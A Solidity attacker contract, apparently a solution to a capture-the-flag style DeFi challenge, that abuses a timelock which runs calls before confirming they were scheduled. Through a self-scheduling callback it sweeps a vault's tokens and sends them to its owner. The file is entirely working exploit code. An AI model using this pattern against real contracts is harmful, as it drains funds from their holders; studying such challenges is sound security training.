// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "../ClimberTimelock.sol";
import "../ClimberVault.sol";

/**
 * @title AttackerC12
 * @author Georgi Nikolaev Georgiev
 */
contract AttackerC12 {
    using Address for address;

    address immutable owner;
    IERC20 immutable token;

    ClimberTimelock immutable timelock;
    ClimberVault immutable vault;

    address[] targets;
    uint256[] values;
    bytes[] dataElements;

    constructor(
        address payable _timelock,
        address _vault,
        address _token
    ) {
        owner = msg.sender;
        token = IERC20(_token);
        timelock = ClimberTimelock(_timelock);
        vault = ClimberVault(_vault);
    }

    function exploit(
        address[] memory _targets,
        uint256[] memory _values,
        bytes[] memory _dataElements
    ) external {
        targets = _targets;
        values = _values;
        dataElements = _dataElements;

        uint256 ourInitialBal = token.balanceOf(address(this));
        uint256 vaultInitialBal = token.balanceOf(address(vault));

        timelock.execute(_targets, _values, _dataElements, 0);
        vault.sweepFunds(address(token));

        uint256 ourNewBal = token.balanceOf(address(this));
        uint256 vaultNewBal = token.balanceOf(address(vault));

        require(
            vaultNewBal == 0 && ourNewBal >= ourInitialBal + vaultInitialBal,
            "Attack failed!"
        );

        token.transfer(owner, ourNewBal);
    }

    function schedule() external {
        timelock.schedule(targets, values, dataElements, 0);
    }
}
